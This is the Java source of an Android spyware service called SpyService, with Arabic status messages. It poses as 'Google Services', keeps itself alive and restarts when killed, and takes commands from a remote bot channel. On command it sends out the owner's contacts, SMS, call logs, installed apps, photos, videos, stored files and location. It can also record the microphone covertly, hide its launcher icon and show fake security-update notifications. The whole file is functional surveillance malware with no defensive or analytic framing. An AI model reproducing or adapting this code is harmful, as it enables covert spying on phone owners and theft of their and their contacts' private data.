package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private BotAPI bot;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        bot = new BotAPI();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
                .setContentTitle("Google Services")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build());

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        registerDevice();

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::pollCommands, 2, Config.get().poll_interval_sec, TimeUnit.SECONDS);
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            bot.sendText("REGISTER:" + info.toString());
        } catch (Exception e) { Log.e(TAG, "reg err", e); }
    }

    private void pollCommands() {
        try {
            String response = bot.getUpdates();
            if (response == null) return;
            JSONObject json = new JSONObject(response);
            if (!json.getBoolean("ok")) return;
            JSONArray updates = json.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject upd = updates.getJSONObject(i);
                int updId = upd.getInt("update_id");
                if (updId <= bot.lastUpdateId) continue;
                bot.lastUpdateId = updId + 1;
                if (upd.has("message")) {
                    JSONObject msg = upd.getJSONObject("message");
                    if (msg.has("text")) {
                        String txt = msg.getString("text");
                        if (txt.startsWith("CMD:")) {
                            executeCommand(txt.substring(4).trim());
                        }
                    }
                }
            }
        } catch (Exception e) { Log.e(TAG, "poll err", e); }
    }

    private void executeCommand(String cmd) {
        try {
            switch (cmd) {
                case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
                case "GET_SMS": sendFile(collectSms(), "💬 الرسائل"); break;
                case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
                case "GET_LOCATION": getLocation(); break;
                case "START_RECORD": startRecording(); break;
                case "STOP_RECORD": stopRecording(); break;
                case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات"); break;
                case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 الصور"); break;
                case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 الفيديوهات"); break;
                case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
                case "HIDE_APP": hideApp(); break;
                case "SHOW_APP": showApp(); break;
                case "FAKE_NOTIF": showFakeNotification(); break;
            }
        } catch (Exception e) {
            bot.sendText("❌ خطأ: " + e.getMessage());
        }
    }

    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        FileOutputStream fos = new FileOutputStream(f);
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                fos.write((name + " : " + phone + "\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                fos.write(("من: " + address + "\n" + body + "\n---\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "call_log.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                fos.write(("رقم: " + number + " | الاسم: " + name + " | النوع: " + type + " | المدة: " + duration + "s\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        FileOutputStream fos = new FileOutputStream(f);
        android.content.pm.PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
        for (android.content.pm.PackageInfo pkg : packages) {
            String name = pkg.applicationInfo.loadLabel(pm).toString();
            fos.write((name + " | " + pkg.packageName + "\n").getBytes());
        }
        fos.close();
        return f;
    }

    private File collectMedia(String type) throws Exception {
        File zipFile = new File(getCacheDir(), type + ".zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        Uri uri = type.equals("images") ? android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {android.provider.MediaStore.MediaColumns.DATA,
                android.provider.MediaStore.MediaColumns.DISPLAY_NAME};
        Cursor cursor = getContentResolver().query(uri, projection, null, null,
                android.provider.MediaStore.MediaColumns.DATE_ADDED + " DESC LIMIT 30");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                String name = cursor.getString(1);
                File file = new File(path);
                if (file.exists()) {
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    ZipEntry ze = new ZipEntry(name);
                    zos.putNextEntry(ze);
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    zos.closeEntry();
                    fis.close();
                }
            }
            cursor.close();
        }
        zos.close();
        return zipFile;
    }

    private File collectAllFiles() throws Exception {
        File zipFile = new File(getCacheDir(), "all_files.zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists()) addDirToZip(zos, download, "Downloads");
        zos.close();
        return zipFile;
    }

    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
                zos.putNextEntry(ze);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                zos.closeEntry();
                fis.close();
            }
        }
    }

    private void sendFile(File file, String caption) {
        if (file.exists()) {
            bot.sendFile(file, caption);
            file.delete();
        }
    }

    private void getLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        try {
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                bot.sendLocation(loc.getLatitude(), loc.getLongitude());
            } else {
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(Location l) {
                        bot.sendLocation(l.getLatitude(), l.getLongitude());
                    }
                    @Override public void onStatusChanged(String p, int s, Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (SecurityException e) {
            bot.sendText("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void startRecording() {
        try {
            audioPath = getCacheDir() + "/recording.mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioBitRate(128000);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            isRecording = true;
            bot.sendText("🎤 بدأ التسجيل");
        } catch (Exception e) {
            bot.sendText("❌ فشل التسجيل: " + e.getMessage());
        }
    }

    private void stopRecording() {
        if (isRecording && recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                File f = new File(audioPath);
                if (f.exists()) {
                    bot.sendVoice(f);
                    f.delete();
                }
                bot.sendText("⏹ توقف التسجيل");
            } catch (Exception e) {
                bot.sendText("❌ فشل إيقاف التسجيل: " + e.getMessage());
            }
        }
    }

    private void hideApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        bot.sendText("👁 مخفي");
    }

    private void showApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        bot.sendText("👁 ظاهر");
    }

    private void showFakeNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(ch);
        }
        nm.notify((int)(System.currentTimeMillis()%9999),
                new NotificationCompat.Builder(this, "fake")
                        .setContentTitle("📥 تحديث أمني")
                        .setContentText("تم تنزيل تحديث 245MB")
                        .setSmallIcon(android.R.drawable.stat_sys_download)
                        .setProgress(100, 45, false)
                        .setOngoing(true)
                        .build());
        bot.sendText("🔔 إشعار وهمي أُرسل");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        startService(new Intent(this, SpyService.class));
    }
}
